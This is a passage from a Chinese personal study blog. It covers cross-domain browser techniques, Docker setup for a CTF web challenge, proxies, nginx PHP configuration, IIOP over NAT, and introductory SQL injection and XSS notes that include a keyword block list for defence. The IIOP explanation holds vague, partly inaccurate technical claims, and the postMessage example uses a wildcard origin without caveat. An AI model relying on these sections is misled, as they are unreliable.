<h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
</blockquote>
<h2 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h2><blockquote>
<p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。</p>
<p>**<u>服务器代理是万能的</u>**。</p>
</blockquote>
<h2 id="document-domain-跨域"><a href="#document-domain-跨域" class="headerlink" title="document.domain 跨域"></a>document.domain 跨域</h2><blockquote>
<p>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。</p>
</blockquote>
<p>比如，</p>
<p>有一个页面，它的地址是 <code>http://www.laixiangran.cn/a.html</code>，在这个页面里面有一个 iframe，它的 src 是 <code>http://laixiangran.cn/b.html</code>。</p>
<blockquote>
<p>很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。</p>
<p>这个时候，document.domain 就可以派上用场了，我们只要把 <code>http://www.laixiangran.cn/a.html</code> 和 <code>http://laixiangran.cn/b.html</code> 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：<code>a.b.laixiangran.cn</code> 中某个文档的 document.domain 可以设成 <code>a.b.laixiangran.cn</code>、<code>b.laixiangran.cn</code> 、<code>laixiangran.cn</code> 中的任意一个，但是不可以设成 <code>c.a.b.laixiangran.cn</code> ，因为这是当前域的子域，也不可以设成 <code>baidu.com</code>，因为主域已经不相同了。</p>
</blockquote>
<p>例如，在页面 <code>http://www.laixiangran.cn/a.html</code> 中设置document.domain：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// 设置成主域</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>).<span class="property">contentWindow</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在页面 <code>http://laixiangran.cn/b.html</code> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 <code>laixiangran.cn</code>，但是还是必须显式地设置 document.domain 的值：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// document.domain 设置成与主页面相同</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，<code>http://www.laixiangran.cn/a.html</code> 就可以通过 js 访问到 <code>http://laixiangran.cn/b.html</code> 中的各种属性和对象了。</p>
<h2 id="window-name-跨域"><a href="#window-name-跨域" class="headerlink" title="window.name 跨域"></a><a href="https://link.juejin.cn/?target=http://window.name">window.name</a> 跨域</h2><blockquote>
<p>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 <code>window.name</code> 的，每个页面对 <code>window.name</code> 都有读写的权限，<code>window.name</code> 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
</blockquote>
<p>通过下面的例子介绍如何通过 <a href="https://link.juejin.cn/?target=http://window.name">window.name</a> 来跨域获取数据的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 重置 iframe 的 onload 事件程序，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 此时经过后面代码重置 src 之后，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> data = iframe.<span class="property">contentWindow</span>.<span class="property">name</span>; <span class="comment">// 4. 获取 iframe 里的 window.name</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// hello world!</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">src</span> = <span class="string">&#x27;http://www.laixiangran.cn/c.html&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值 </span><br><span class="line">    <span class="attr">window.name</span> = <span class="string">&quot;hello world!&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="location-hash-跨域"><a href="#location-hash-跨域" class="headerlink" title="location.hash 跨域"></a>location.hash 跨域</h2><blockquote>
<p>location.hash 方式跨域，是子框架修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p>
</blockquote>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. 设置父页面的 hash 值</span><br><span class="line">    <span class="attr">parent.location.hash</span> = <span class="string">&quot;world&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="postMessage-跨域"><a href="#postMessage-跨域" class="headerlink" title="postMessage 跨域"></a>postMessage 跨域</h2><blockquote>
<p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。</p>
<p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p>
<p>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p>
</blockquote>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">        win.<span class="title function_">postMessage</span>(<span class="string">&#x27;我是来自 http://www.laixiangran.cn/a.html 页面的消息&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 注册 message 事件用来接收消息</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e = e || event; <span class="comment">// 获取事件对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// 通过 data 属性得到发送来的消息</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a href="https://link.juejin.cn/?target=https://www.cnblogs.com/2050/p/3191744.html">js中几种实用的跨域方法原理详解</a></li>
<li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/28562290">跨域的那些事儿</a></li>
<li><a href="https://link.juejin.cn/?target=http://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解</a></li>
</ul>
</blockquote>
<h1 id="记一次docker搭建复现web题目环境"><a href="#记一次docker搭建复现web题目环境" class="headerlink" title="记一次docker搭建复现web题目环境"></a>记一次docker搭建复现web题目环境</h1><h2 id="1-构造镜像"><a href="#1-构造镜像" class="headerlink" title="1.构造镜像"></a>1.构造镜像</h2><p><a data-fancybox="gallery" data-src="/Noteless/image-20230122143200058.png"><img src="/Noteless/image-20230122143200058.png" alt="image-20230122143200058"></a></p>
<p>可以看到这里有个<code>Dockerfile</code>文件</p>
<blockquote>
<p><code>docker build -t image_name .</code><br>&#x2F;&#x2F;这里是利用<code>dockerfile</code>创建一个命名为<code>image_name</code>的镜像【后面的点不能少】</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122143320959.png"><img src="/Noteless/image-20230122143320959.png" alt="image-20230122143320959"></a></p>
<h2 id="2-查看镜像是否创建成功"><a href="#2-查看镜像是否创建成功" class="headerlink" title="2.查看镜像是否创建成功"></a>2.查看镜像是否创建成功</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122144225392.png"><img src="/Noteless/image-20230122144225392.png" alt="image-20230122144225392"></a></p>
<h2 id="3-运行启动镜像，创建环境"><a href="#3-运行启动镜像，创建环境" class="headerlink" title="3.运行启动镜像，创建环境"></a>3.运行启动镜像，创建环境</h2><blockquote>
<p><code>docker run -i -d -P image_name</code> </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122144315740.png"><img src="/Noteless/image-20230122144315740.png" alt="image-20230122144315740"></a></p>
<h2 id="4-查看容器启动端口"><a href="#4-查看容器启动端口" class="headerlink" title="4.查看容器启动端口"></a>4.查看容器启动端口</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122144348333.png"><img src="/Noteless/image-20230122144348333.png" alt="image-20230122144348333"></a></p>
<p>可以看到是再32768端口运行</p>
<blockquote>
<p>访问<code>127.0.0.1:32768</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122144453902.png"><img src="/Noteless/image-20230122144453902.png" alt="image-20230122144453902"></a></p>
<p>搭建成功</p>
<h2 id="5-关闭容器"><a href="#5-关闭容器" class="headerlink" title="5.关闭容器"></a>5.关闭容器</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122150253748.png"><img src="/Noteless/image-20230122150253748.png" alt="image-20230122150253748"></a></p>
<blockquote>
<p><code>docker stop CONTAINER ID </code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122214402594.png"><img src="/Noteless/image-20230122214402594.png" alt="image-20230122214402594"></a></p>
<h2 id="6-删除镜像【觉得环境镜像后面有用的可以留着】"><a href="#6-删除镜像【觉得环境镜像后面有用的可以留着】" class="headerlink" title="6.删除镜像【觉得环境镜像后面有用的可以留着】"></a>6.删除镜像【觉得环境镜像后面有用的可以留着】</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122150428681.png"><img src="/Noteless/image-20230122150428681.png" alt="image-20230122150428681"></a></p>
<blockquote>
<p><code>docker rmi IMAGE ID</code></p>
<p>&#x2F;&#x2F;注：有的需要强制，所以需要在后面加上参数<code>-f</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230122214537155.png"><img src="/Noteless/image-20230122214537155.png" alt="image-20230122214537155"></a></p>
<h2 id="ps-进入容器环境"><a href="#ps-进入容器环境" class="headerlink" title="ps.进入容器环境"></a>ps.进入容器环境</h2><blockquote>
<p><code>sudo docker exec -it filechecker_pro_max_web1_1 /bin/bash</code><br>#filechecker_pro_max_web1_1为容器名字</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Noteless/image-20230314214001396.png"><img src="/Noteless/image-20230314214001396.png" alt="image-20230314214001396"></a></p>
<h1 id="反向代理和正向代理的区别"><a href="#反向代理和正向代理的区别" class="headerlink" title="反向代理和正向代理的区别"></a>反向代理和正向代理的区别</h1><p>正向代理和反向代理都是代理服务器的应用，它们的<code>主要区别在于代理服务器的位置和作用</code>：</p>
<blockquote>
<ul>
<li><p>正向代理（Forward Proxy）：代理服务器位于<code>客户端和目标服务器之间</code>，代理服务器<code>充当客户端的代表</code>，向目标服务器<code>发送请求</code>并将响应返回给客户端。客户端向代理服务器发出请求，然后代理服务器将请求转发给目标服务器，最终将响应返回给客户端。正向代理主要用于访问外部网络或突破访问限制，<code>客户端需要知道代理服务器的存在并向其发出请求</code>。</p>
</li>
<li><p>反向代理（Reverse Proxy）：代理服务器位于<code>目标服务器和客户端之间</code>，代理服务器充<code>当目标服务器的代表</code>，向目标服务器<code>接收请求</code>并将响应返回给客户端。客户端向代理服务器发出请求，代理服务器根据一定规则将请求转发到目标服务器上，并将目标服务器的响应返回给客户端。反向代理主要用于负载均衡、安全控制和缓存等方面，<code>客户端不需要知道目标服务器的存在</code>。</p>
</li>
</ul>
</blockquote>
<p>总的来说，正向代理和反向代理都是代理服务器的应用，它们的主要区别在于代理服务器的位置和作用。</p>
<blockquote>
<p>正向代理是客户端向代理服务器发出请求，代理服务器再向目标服务器发送请求，并将响应返回给客户端；</p>
<p>反向代理是客户端向代理服务器发出请求，代理服务器再将请求转发到目标服务器上，并将目标服务器的响应返回给客户端。</p>
</blockquote>
<h1 id="以nginx为例，访问静态文件与php文件区别是什么？如何配置php文件的解析？"><a href="#以nginx为例，访问静态文件与php文件区别是什么？如何配置php文件的解析？" class="headerlink" title="以nginx为例，访问静态文件与php文件区别是什么？如何配置php文件的解析？"></a>以nginx为例，访问静态文件与php文件区别是什么？如何配置php文件的解析？</h1><blockquote>
<p>在Nginx中，访问静态文件和PHP文件的处理方式有所不同。静态文件通常是指图片、CSS、JavaScript等不需要动态生成的文件，而PHP文件则是需要动态生成HTML内容的文件。</p>
</blockquote>
<blockquote>
<p>对于静态文件的访问，Nginx可以直接返回这些文件，不需要对其进行任何处理，这可以提高Nginx的响应速度和性能。配置Nginx处理静态文件的方式通常如下：</p>
</blockquote>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    root /<span class="built_in">var</span>/www/example.com;</span><br><span class="line">    <span class="keyword">index</span> <span class="keyword">index</span>.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的配置表示，当访问&#x2F;example.com&#x2F;static时，Nginx会将请求映射到&#x2F;var&#x2F;www&#x2F;example.com&#x2F;static目录下，并返回该目录下的index.html文件（如果存在）。</p>
</blockquote>
<blockquote>
<p>对于<code>PHP文件</code>的访问，<code>Nginx</code>需要将请求发送给<code>PHP解释器</code>进行处理，并将解析后的结果返回给客户端。为了实现这一功能，需要配置Nginx与PHP解释器之间的通信方式。通常，可以使用FastCGI协议来实现Nginx与PHP解释器之间的通信，具体配置方式如下：</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$args</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/run/php-fpm/php-fpm.sock;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的配置表示，当访问&#x2F;example.com时，Nginx会首先查找该目录下是否存在请求的文件，如果存在则直接返回该文件，否则将请求转发到FastCGI服务，FastCGI服务会将请求发送给PHP解释器进行处理。其中，location ~ .php$ 表示匹配所有以.php结尾的请求，fastcgi_pass指定了PHP解释器的地址，SCRIPT_FILENAME指定了PHP解释器需要处理的文件路径。需要注意的是，需要安装PHP解释器和FastCGI服务，具体安装方式可以参考官方文档或其他资源。</p>
</blockquote>
<h1 id="IIOP的NAT网络问题"><a href="#IIOP的NAT网络问题" class="headerlink" title="IIOP的NAT网络问题"></a>IIOP的NAT网络问题</h1><blockquote>
<p>IIOP（Internet Inter-ORB Protocol）是一种<strong>用于不同计算机之间通信的协议</strong>，常用于分布式应用程序中。然而，在使用IIOP时，如果涉及到NAT（网络地址转换）网络，则可能会遇到一些问题。</p>
<p>NAT是一种将私有IP地址转换为公共IP地址的技术，以实现在不同网络之间通信。但是，由于<strong>NAT会修改数据包的源地址和目标地址</strong>，因此可能会影响到IIOP通信的正确性和可靠性，</p>
<p>具体表现为：</p>
<ol>
<li>IIOP<code>请求无法到达目标机器</code>：由于NAT会改变数据包的源IP地址，因此，<code>当一个IIOP请求离开私有网络时，NAT会将源IP地址修改为公共IP地址</code>。但是，<u><strong>由于IIOP协议中包含了源IP地址，因此，当响应返回时，如果源IP地址不是私有IP地址，则响应将无法到达目标机器，导致通信失败</strong></u>。</li>
<li>IIOP<code>响应无法到达源机器</code>：类似地，当一个IIOP请求到达目标机器时，<code>NAT会将目标IP地址修改为私有IP地址，以便将响应返回到源机器</code>。但是，<u><strong>由于IIOP协议中包含了目标IP地址，因此，如果响应返回的目标IP地址不是公共IP地址，则响应无法到达源机器，导致通信失败</strong></u>。</li>
<li>IIOP<code>会话终止</code>：如果一个IIOP会话的<code>任一方在使用NAT网络</code>时<code>发生地址转换</code>，那么会话可能会在NAT设备上终止，<code>导致通信中断</code>。</li>
</ol>
<p>为了解决这些问题，可以使用一些技术，例如<code>端口映射、反向代理</code>等，以确保IIOP请求和响应正确到达目标机器和源机器。</p>
</blockquote>
<p>那么可以根据网站编写的语言，用对应的语言对iiop的规则进行重写，以达到减少通讯冲突的结果</p>
<p>以<code>java</code>和<code>go</code>对iiop的规则进行重写为例</p>
<blockquote>
<p>Java可以使用一些技术来重写IIOP规则，以确保IIOP在NAT网络中的正确性和可靠性。具体来说，以下是几种Java技术：</p>
<ol>
<li>使用Java Naming and Directory Interface (JNDI)：<code>JNDI</code>是Java中用于访问命名和目录服务的API。可以使用JNDI来连接到IIOP服务器，并通过<code>命名服务的名称解析</code>来<code>避免在IIOP请求和响应中使用IP地址</code>。这样可以<code>减少NAT对IIOP请求和响应的影响</code>。</li>
<li>使用Java IIOP ORB属性：Java IIOP ORB属性是一组用于配置IIOP ORB的属性，<code>包括IP地址和端口</code>等。可以在代码中设置这些属性，以<code>确保IIOP请求和响应正确到达目标机器和源机器</code>。</li>
<li>使用Java IIOP反向代理：<code>Java IIOP反向代理</code>是一种用于在公共网络上部署的IIOP服务器。反向代理可以将IIOP<code>请求转发到私有网络中的IIOP服务器</code>，以<code>避免在IIOP请求和响应中使用IP地址</code>。Java IIOP反向代理通常是<code>基于Java IIOP ORB</code>实现的。</li>
</ol>
</blockquote>
<blockquote>
<p>Go语言可以使用一些技术来重写IIOP规则，以确保IIOP在NAT网络中的正确性和可靠性。以下是几种Go技术：</p>
<ol>
<li>使用Go CORBA库：<code>Go CORBA库</code>是一组用于CORBA开发的Go语言库。可以使用Go CORBA库连接到IIOP服务器，并通过CORBA对象的<code>名称解析来避免在IIOP请求和响应中使用IP地址</code>。这样可以减少NAT对IIOP请求和响应的影响。</li>
<li>使用Go IIOP反向代理：Go IIOP反向代理是一种用于在公共网络上部署的IIOP服务器。<code>反向代理可以将IIOP请求转发到私有网络中的IIOP服务器</code>，以避免在IIOP请求和响应中使用IP地址。Go IIOP反向代理通常是基于Go CORBA库实现的。</li>
<li>使用Go TCP代理：Go TCP代理是一种用于在公共网络上部署的TCP服务器。可以将<code>IIOP请求和响应通过TCP代理传输</code>，并在代理服务器上<code>进行地址转换</code>，以<code>确保IIOP请求和响应</code>正确到达目标机器和源机器。</li>
</ol>
</blockquote>
<p>可以以实际的情况用不同语言和方法进行修改以达到iiop与net冲突减少或者消失的目的</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>daily</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB学习</title>
    <url>/Web-study/</url>
    <content><![CDATA[<p><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></p>
<p><code>不要急于求成，慢即是快，少即是多</code></p>
<p><code>好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记</code></p>
<p><code>学东西就只当学一次，一次学到最好，不要囫囵吞枣</code></p>
<hr>
<p>思路绝对不要被局限！！！</p>
<span id="more"></span>

<h1 id="基础漏洞知识"><a href="#基础漏洞知识" class="headerlink" title="基础漏洞知识"></a>基础漏洞知识</h1><blockquote>
<p>–转载原文链接：<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
</blockquote>
<h2 id="一、sql漏洞篇"><a href="#一、sql漏洞篇" class="headerlink" title="一、sql漏洞篇"></a>一、sql漏洞篇</h2><blockquote>
<p><a href="#%E4%B8%80%E3%80%81sql">sql漏洞知识点记录</a></p>
</blockquote>
<h3 id="1-sql漏洞原理"><a href="#1-sql漏洞原理" class="headerlink" title="1.sql漏洞原理"></a>1.sql漏洞原理</h3><p>指web应用程序<u><strong>对用户输入的数据合法性没有判断</strong></u>，导致攻击者可以<u><strong>构造不同的sql语句来对数据库数据库的操作</strong></u>。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。</p>
<blockquote>
<p>Sql注入漏洞的产生需要满足两个条件：<br>①参数用户可控：<u><strong>前端传给后端的参数内容是用户可以控制的</strong></u>。<br>②<u><strong>参数代入数据库查询</strong></u>：传入的参数拼接到sql语句，且带入数据库查询。</p>
</blockquote>
<h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①数据库信息泄漏：数据库中存放的<u><strong>用户的隐私信息的泄露</strong></u>。<br>②网页篡改：通过操作数据库对特定网页进行篡改。<br>③网站被挂马，传播恶意软件：<u><strong>修改数据库一些字段的值，嵌入网马链接</strong></u>，进行挂马攻击。<br>④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>⑥破坏硬盘数据，瘫痪全系统。</p>
</blockquote>
<h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①<u><strong>过滤危险字符</strong></u>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。<br>②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。<br>③特殊字符转义、使用严格的数据类型。</p>
</blockquote>
<h2 id="二、xss漏洞篇"><a href="#二、xss漏洞篇" class="headerlink" title="二、xss漏洞篇"></a>二、xss漏洞篇</h2><h3 id="1-xss漏洞原理"><a href="#1-xss漏洞原理" class="headerlink" title="1.xss漏洞原理"></a>1.xss漏洞原理</h3><p>恶意攻击者<u><strong>往Web页面里嵌入脚本代码</strong></u>（<u><strong>通常是JavaScript编写的恶意代码</strong></u>），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者<u><strong>利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码</strong></u>，嵌入到web页面中去。）</p>
